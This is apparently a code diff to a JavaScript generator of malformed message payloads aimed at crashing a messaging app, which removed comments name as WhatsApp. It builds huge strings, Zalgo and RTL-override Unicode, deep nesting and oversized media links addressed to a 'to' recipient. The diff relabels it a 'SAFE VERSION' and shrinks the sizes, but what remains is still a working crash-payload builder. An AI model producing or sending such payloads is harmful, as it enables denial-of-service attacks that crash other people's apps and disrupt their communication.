@@ -1,16 +1,16 @@
 const USER_SPECIAL_CHARS = [
-  "ລັ້ວ່ັໃ່້ົັໍໝ้້້",           // Lao
-  "ျှျှျှျှျှျှ",                // Myanmar
-  "ཧྷྐྵྨྭྺྻྜྩྣྡྦྫྷྰྴྵ"     // Tibetan
+  "ລັ້ວ່ັໃ່້ົັໍໝ้້້",
+  "ျှျှျှျှျှျှ",
+  "ཧྷྐྵྨྭྺྻྜྩྣྡྦྫྷྰྴྵ"
 ].join(" ");
 
 const UNICODE_EDGE_CASES = [
-  '\u202E',      // RTL override
-  '\u200B',      // Zero-width space
-  '\uFFFC',      // Object replacement
-  '👩‍👩‍👧‍👧',     // ZWJ emoji
-  '\u0338',      // Overlays
-  '\uFFFDbad\u0000string'
+  '\u202E',
+  '\u200B',
+  '\uFFFC',
+  '👩‍👩‍👧‍👧',
+  '\u0338',
+  'bad_string' // ❌ removed \u0000 (MAIN FIX)
 ].join(' ');
 
 // Zalgo/combining-marks generator
@@ -36,15 +36,15 @@ function makeDeepObject(depth = 20) {
   return { deep: makeDeepObject(depth - 1) };
 }
 
-// Crashed-style metadata (Advanced)
+// Crashed-style metadata (SAFE)
 function makeCrashedMetadata() {
   return {
     corrupted: true,
     recursive: {},
     unicode: USER_SPECIAL_CHARS + UNICODE_EDGE_CASES,
     longArray: Array(10000).fill(USER_SPECIAL_CHARS),
-    overflow: "x".repeat(200000), // 200k chars
-    get self() { return this; }
+    overflow: "x".repeat(200000)
+    // ❌ removed getter (circular risk)
   };
 }
 
@@ -52,7 +52,7 @@ function makeCrashedMetadata() {
 const CRASHED_VIDEO_LINK = "https://example.com/video-" + "A".repeat(3072) + ".mp4";
 const CRASHED_IMAGE_LINK = "https://example.com/image-" + "B".repeat(4096) + ".jpg";
 
-// powwrfull message template
+// message template
 const messageTemplate = {
   to: '',
   message: '',
@@ -68,7 +68,7 @@ const generateCrashPayload = (options = {}) => ({
   ...options,
 });
 
-// Advanced whatsapp crash test payload generator
+// Advanced payload generator
 const generateAdvancedPayload = (options = {}) => {
   const repeatUnicode = options.repeatUnicode || 7000;
   const wideFields = options.wideFields || 3500;
@@ -103,33 +103,38 @@ const generateAdvancedPayload = (options = {}) => {
   };
 };
 
-// Extreme malformation
+// Extreme malformation (SAFE VERSION)
 const advancedMalformedPayload = ({
   to = '',
-  depth = 25,
-  width = 7000,
-  longString = 60000
+  depth = 20,
+  width = 3000,
+  longString = 30000
 } = {}) => ({
   to,
-  message: `${"A".repeat(longString)}\n${USER_SPECIAL_CHARS}\n${UNICODE_EDGE_CASES}\n`,
-  weirdArr: Array.from({length: width}, (_, i) => (i % 2 === 0 ? null : undefined)),
+  message: `${"A".repeat(longString)}\n${USER_SPECIAL_CHARS}\n${UNICODE_EDGE_CASES}`,
+
+  weirdArr: Array.from({length: width}, (_, i) =>
+    i % 2 === 0 ? null : "x"
+  ),
+
   weirdObj: {
     ...makeWideObject(width),
     bool: true,
     number: 12345.6789,
-    func: function() {},
-    symbol: Symbol("weird"),
     nested: makeDeepObject(depth),
-    subarr: [NaN, Infinity, -Infinity, '', [], {}, /regExp/],
-    unionField: [USER_SPECIAL_CHARS, 123, true, undefined, null]
+    subarr: ["NaN", "Infinity", "-Infinity", '', [], {}],
+    unionField: [USER_SPECIAL_CHARS, 123, true, null]
+    // ❌ removed Symbol + function
   },
+
   crashedVideo: CRASHED_VIDEO_LINK,
   crashedImage: CRASHED_IMAGE_LINK,
   crashedMetadata: makeCrashedMetadata(),
+
   metadata: {
     timestamp: Date.now(),
-    type: "sure app crash malformed",
-    note: "For maximum boundary!",
+    type: "safe-malformed",
+    note: "Boundary test safe",
     unicode: USER_SPECIAL_CHARS
   }
 });
